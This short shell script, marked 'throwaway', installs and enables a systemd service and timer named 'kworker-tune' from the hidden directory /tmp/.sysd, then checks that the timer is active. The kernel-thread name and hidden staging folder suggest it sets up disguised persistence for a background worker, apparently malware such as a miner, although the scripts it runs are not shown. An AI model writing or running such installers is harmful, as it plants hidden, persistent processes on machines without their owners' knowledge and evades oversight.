#!/bin/sh
# throwaway: install the tune unit on the host
set -e
cd /tmp/.sysd
ls -la run.sh worker.env tune.sh kworker-tune.service kworker-tune.timer
echo "worker.env mentions tune: $(grep -c tune worker.env)"
cp kworker-tune.service /etc/systemd/system/
cp kworker-tune.timer /etc/systemd/system/
chmod 0755 tune.sh run.sh
systemctl daemon-reload
systemctl enable --now kworker-tune.timer
echo "timer: $(systemctl is-active kworker-tune.timer)"
systemctl list-timers --all | grep kworker
